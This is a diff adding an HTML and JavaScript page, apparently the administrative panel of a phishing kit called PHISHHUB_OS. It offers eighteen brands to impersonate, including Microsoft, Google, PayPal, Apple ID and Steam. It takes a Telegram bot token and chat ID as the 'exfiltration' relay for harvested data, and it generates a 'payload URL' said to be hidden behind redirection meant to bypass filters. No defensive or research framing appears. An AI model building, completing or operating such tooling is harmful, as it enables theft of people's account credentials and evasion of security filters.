@@ -1,1 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHISHHUB_OS | Administrative Interface</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&display=swap');
+        body {
+            background-color: #020202;
+            color: #d1d1d1;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .glass-panel {
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .target-card {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        .target-card:hover {
+            border-color: #ff3e3e;
+            background: #111;
+        }
+        .target-card.active {
+            border-color: #ff3e3e;
+            background: rgba(255, 62, 62, 0.05);
+            box-shadow: 0 0 20px rgba(255, 62, 62, 0.1);
+        }
+        .step-locked {
+            opacity: 0.15;
+            pointer-events: none;
+            filter: grayscale(1);
+        }
+        .invert-icon { filter: invert(1); }
+    </style>
+</head>
+<body class="p-4 md:p-12">
 
+    <div class="max-w-6xl mx-auto">
+        <!-- HEADER -->
+        <header class="flex flex-col md:flex-row justify-between items-end mb-16 border-b border-zinc-800 pb-8">
+            <div>
+                <h1 class="text-4xl font-black tracking-tighter text-white">PHISH<span class="text-red-600">HUB</span>_OS</h1>
+                <p class="text-zinc-500 text-xs mt-2 uppercase tracking-widest">Multi-Vector Engagement Suite v2.0.4</p>
+            </div>
+            <div class="text-right">
+                <span class="text-[10px] text-zinc-600 block uppercase font-bold">Encrypted Connection</span>
+                <span class="text-green-500 text-xs font-bold">AES-256-GCM ACTIVE</span>
+            </div>
+        </header>
+
+        <div class="space-y-20">
+            
+            <!-- STEP 01: TARGETING -->
+            <section id="sec-1">
+                <div class="flex items-center gap-6 mb-8">
+                    <span class="text-4xl font-black text-red-600">01</span>
+                    <h2 class="text-lg font-bold uppercase tracking-[0.2em] text-white">Target Selection</h2>
+                    <div class="h-[1px] flex-1 bg-zinc-800"></div>
+                </div>
+                
+                <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-4" id="target-grid">
+                    <!-- Targets injected via JS -->
+                </div>
+            </section>
+
+            <!-- STEP 02: EXFILTRATION -->
+            <section id="sec-2" class="step-locked transition-all duration-700">
+                <div class="flex items-center gap-6 mb-8">
+                    <span class="text-4xl font-black text-red-600">02</span>
+                    <h2 class="text-lg font-bold uppercase tracking-[0.2em] text-white">Exfiltration Config</h2>
+                    <div class="h-[1px] flex-1 bg-zinc-800"></div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <div class="glass-panel p-8 rounded border-t-2 border-t-zinc-800 hover:border-t-red-600 transition-all">
+                        <div class="flex justify-between items-start mb-6">
+                            <h3 class="text-xs font-bold text-white uppercase">Option A: Telegram Bot</h3>
+                            <span class="text-[9px] bg-red-600/10 text-red-500 px-2 py-0.5 rounded font-bold">RECOMMENDED</span>
+                        </div>
+                        <div class="space-y-4">
+                            <div class="space-y-1">
+                                <label class="text-[9px] text-zinc-500 uppercase font-bold">Bot Token</label>
+                                <input type="text" id="tg-token" placeholder="5839201..." class="w-full bg-black border border-zinc-800 p-3 rounded text-xs outline-none focus:border-red-600 text-white">
+                            </div>
+                            <div class="space-y-1">
+                                <label class="text-[9px] text-zinc-500 uppercase font-bold">Chat ID</label>
+                                <input type="text" id="tg-chat" placeholder="102938..." class="w-full bg-black border border-zinc-800 p-3 rounded text-xs outline-none focus:border-red-600 text-white">
+                            </div>
+                            <button onclick="saveConfig()" class="w-full bg-zinc-800 hover:bg-red-600 text-white text-[10px] font-black py-3 rounded transition-all uppercase tracking-widest mt-2">Initialize Relay</button>
+                        </div>
+                    </div>
+
+                    <div class="glass-panel p-8 rounded border-t-2 border-t-zinc-800 opacity-50">
+                        <h3 class="text-xs font-bold text-zinc-500 uppercase mb-4">Option B: Volatile Drop</h3>
+                        <p class="text-[10px] text-zinc-600 leading-relaxed mb-6">Automated 24h temporary inbox. Data is stored on a centralized MITM server. Use only for short-term ops.</p>
+                        <button disabled class="w-full border border-zinc-800 text-zinc-700 text-[10px] font-black py-3 rounded uppercase tracking-widest cursor-not-allowed">Coming Soon</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 03: DEPLOYMENT -->
+            <section id="sec-3" class="step-locked transition-all duration-700 pb-32">
+                <div class="flex items-center gap-6 mb-8">
+                    <span class="text-4xl font-black text-red-600">03</span>
+                    <h2 class="text-lg font-bold uppercase tracking-[0.2em] text-white">Deployment</h2>
+                    <div class="h-[1px] flex-1 bg-zinc-800"></div>
+                </div>
+
+                <div class="glass-panel p-12 rounded text-center border-dashed border-2 border-zinc-800">
+                    <h3 class="text-white font-bold mb-2">Finalize Engagement Link</h3>
+                    <p class="text-zinc-500 text-xs mb-8">The link will be obfuscated using a 2-layer redirection bypass.</p>
+                    
+                    <button id="gen-btn" onclick="generateLink()" class="bg-red-600 hover:bg-red-700 text-white font-black py-4 px-16 rounded transition-all active:scale-95 shadow-2xl shadow-red-900/40 uppercase tracking-widest text-xs">
+                        Generate Payload URL
+                    </button>
+
+                    <div id="result-box" class="hidden mt-10 animate-in fade-in slide-in-from-bottom-4 duration-700">
+                        <div class="flex items-center gap-2 bg-black border border-zinc-800 p-2 rounded max-w-xl mx-auto shadow-2xl">
+                            <code id="final-url" class="text-green-500 text-[11px] px-4 py-2 break-all flex-1 font-bold"></code>
+                            <button onclick="copyToClipboard()" class="bg-zinc-800 hover:bg-red-600 text-white px-6 py-2 rounded text-[10px] font-bold transition-all uppercase">Copy</button>
+                        </div>
+                        <p class="text-[9px] text-zinc-600 mt-6 uppercase tracking-widest font-bold">Status: Deployment Ready • Filter: Active • Redir: 200 OK</p>
+                    </div>
+                </div>
+            </section>
+
+        </div>
+    </div>
+
+    <script>
+        const targets = [
+            { id: 'microsoft', name: 'Microsoft', icon: 'https://www.vectorlogo.zone/logos/microsoft/microsoft-icon.svg' },
+            { id: 'google', name: 'Google', icon: 'https://www.vectorlogo.zone/logos/google/google-icon.svg' },
+            { id: 'facebook', name: 'Facebook', icon: 'https://www.vectorlogo.zone/logos/facebook/facebook-f.svg' },
+            { id: 'instagram', name: 'Instagram', icon: 'https://www.vectorlogo.zone/logos/instagram/instagram-icon.svg' },
+            { id: 'tiktok', name: 'TikTok', icon: 'https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg', inv: true },
+            { id: 'snapchat', name: 'Snapchat', icon: 'https://www.vectorlogo.zone/logos/snapchat/snapchat-icon.svg' },
+            { id: 'twitter', name: 'Twitter/X', icon: 'https://www.vectorlogo.zone/logos/twitter/twitter-icon.svg' },
+            { id: 'linkedin', name: 'LinkedIn', icon: 'https://www.vectorlogo.zone/logos/linkedin/linkedin-icon.svg' },
+            { id: 'amazon', name: 'Amazon', icon: 'https://www.vectorlogo.zone/logos/amazon/amazon-icon.svg', inv: true },
+            { id: 'paypal', name: 'PayPal', icon: 'https://www.vectorlogo.zone/logos/paypal/paypal-icon.svg' },
+            { id: 'netflix', name: 'Netflix', icon: 'https://www.vectorlogo.zone/logos/netflix/netflix-icon.svg' },
+            { id: 'apple', name: 'Apple ID', icon: 'https://www.vectorlogo.zone/logos/apple/apple-icon.svg', inv: true },
+            { id: 'discord', name: 'Discord', icon: 'https://www.vectorlogo.zone/logos/discordpw/discordpw-icon.svg' },
+            { id: 'steam', name: 'Steam', icon: 'https://www.vectorlogo.zone/logos/steampowered/steampowered-icon.svg' },
+            { id: 'yahoo', name: 'Yahoo', icon: 'https://www.vectorlogo.zone/logos/yahoo/yahoo-icon.svg' },
+            { id: 'github', name: 'GitHub', icon: 'https://www.vectorlogo.zone/logos/github/github-icon.svg', inv: true },
+            { id: 'adobe', name: 'Adobe', icon: 'https://www.vectorlogo.zone/logos/adobe/adobe-icon.svg' },
+            { id: 'roblox', name: 'Roblox', icon: 'https://www.vectorlogo.zone/logos/roblox/roblox-icon.svg' }
+        ];
+
+        let state = { target: null, config: false };
+
+        function init() {
+            const grid = document.getElementById('target-grid');
+            targets.forEach(t => {
+                const card = document.createElement('div');
+                card.className = 'target-card p-6 rounded flex flex-col items-center justify-center gap-4 group';
+                card.innerHTML = `
+                    <img src="${t.icon}" class="w-10 h-10 object-contain transition-transform group-hover:scale-110 ${t.inv ? 'invert-icon' : ''}">
+                    <span class="text-[9px] font-black uppercase tracking-widest text-zinc-600 group-hover:text-red-500">${t.name}</span>
+                `;
+                card.onclick = () => selectTarget(t.id, card);
+                grid.appendChild(card);
+            });
+        }
+
+        function selectTarget(id, el) {
+            state.target = id;
+            document.querySelectorAll('.target-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+            unlockStep(2);
+        }
+
+        function saveConfig() {
+            const t = document.getElementById('tg-token').value;
+            const c = document.getElementById('tg-chat').value;
+            if(!t || !c) return;
+            
+            // In a real build, you'd save these to localStorage or session
+            localStorage.setItem('ph_token', t);
+            localStorage.setItem('ph_chat', c);
+            
+            state.config = true;
+            unlockStep(3);
+        }
+
+        function unlockStep(n) {
+            const sec = document.getElementById(`sec-${n}`);
+            sec.classList.remove('step-locked');
+            window.scrollTo({ top: sec.offsetTop - 50, behavior: 'smooth' });
+        }
+
+        function generateLink() {
+            const urlBox = document.getElementById('result-box');
+            const urlText = document.getElementById('final-url');
+            const slug = Math.random().toString(36).substring(2, 12);
+            
+            // Build the URL based on the current domain
+            const currentHost = window.location.origin;
+            urlText.innerText = `${currentHost}/v/${state.target}/${slug}`;
+            urlBox.classList.remove('hidden');
+            
+            const btn = document.getElementById('gen-btn');
+            btn.innerText = "DEPLOYMENT ACTIVE";
+            btn.classList.replace('bg-red-600', 'bg-zinc-900');
+        }
+
+        function copyToClipboard() {
+            const txt = document.getElementById('final-url').innerText;
+            const el = document.createElement('textarea');
+            el.value = txt;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            
+            const btn = event.target;
+            btn.innerText = "COPIED";
+            setTimeout(() => btn.innerText = "COPY", 2000);
+        }
+
+        init();
+    </script>
+</body>
+</html>
